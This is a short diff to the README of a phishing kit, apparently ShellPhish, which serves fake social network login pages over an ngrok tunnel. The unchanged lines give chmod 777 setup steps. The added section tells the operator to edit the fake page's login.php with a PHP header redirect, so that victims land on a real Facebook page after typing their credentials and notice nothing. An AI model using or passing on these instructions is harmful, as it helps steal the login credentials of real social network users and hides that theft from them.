@@ -26,6 +26,12 @@ Use following cmd
 chmod 777 shellphish.sh
 chmod 777 ngrok
 ```
+### How to redirect to your choice of page after login to fake page?
+Just go to of that social networking site folder and edit login.php file as shown here.
+for e.g. I've redirected it to MyGovIndia facebook page
+```
+header('Location: https://facebook.com/MyGovIndia');
+```
 ### Good Thing:
 ```
 Here we have already provided portforwarding server "ngrok"
